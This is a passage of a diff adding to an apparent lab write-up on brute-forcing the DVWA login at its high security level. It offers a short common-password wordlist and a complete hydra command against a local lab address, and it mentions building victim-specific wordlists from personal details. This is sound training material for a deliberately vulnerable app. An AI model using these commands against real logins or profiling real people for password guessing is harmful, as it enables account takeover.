@@ -320,4 +320,29 @@ This means that the above method would still work but it would take a significan
 
 In fact, if the response time for medium security is around 0.024 seconds, and high security is around 3.2 seconds, the time to brute force with our traditional method would in theory take 133 times as long. 
 
-As a result of this time delay, there are a couple of ways we could approach this.
+One method of approaching this would be to create a smaller, specific wordlist which could save lots of time. 
+
+Let's assume the user is unintelligent and has picked one of the most common passwords. According to [cnn](https://edition.cnn.com/2019/04/22/uk/most-common-passwords-scli-gbr-intl/index.html), the most common passwords are the following:
+
+<pre>123456
+123456789
+qwerty
+password
+111111
+12345678
+abc123
+1234567
+password1
+12345</pre>
+
+Let's put this into a file to use as a wordlist.
+
+![words](https://imgur.com/zPM3eHu.png)
+
+Now use the same hydra command as before but with our new wordlist:
+
+<pre>hydra 192.168.56.118 -l admin -P "common.txt" http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=3f319f0402f5ec006e7b70da8ea92bf4"</pre>
+
+![done](https://imgur.com/HVJjaT3.png)
+
+Creating wordlists according to the person is also an intelligent approach. Attackers often enumerate infroamtion about their victim such as family names, pets, DOB, where they live etc. to create a more efficient dictionary. 
